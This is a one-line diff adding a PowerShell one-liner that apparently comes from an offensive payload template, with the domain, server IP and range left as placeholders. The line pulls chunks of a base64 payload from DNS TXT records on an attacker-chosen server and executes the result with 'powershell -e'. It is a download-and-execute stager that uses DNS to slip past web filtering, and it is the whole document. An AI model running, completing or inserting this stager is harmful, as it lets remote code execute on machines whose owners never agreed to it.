@@ -1,0 +1,1 @@
+$b64=""; (1..*RANGE*) | ForEach-Object { $b64+=(Resolve-DnsName -Name "$_.*DOMAIN*" -Server *SERVERIP* -Type txt | Select-Object -expand Strings -Erroraction Ignore)}; powershell -e $b64
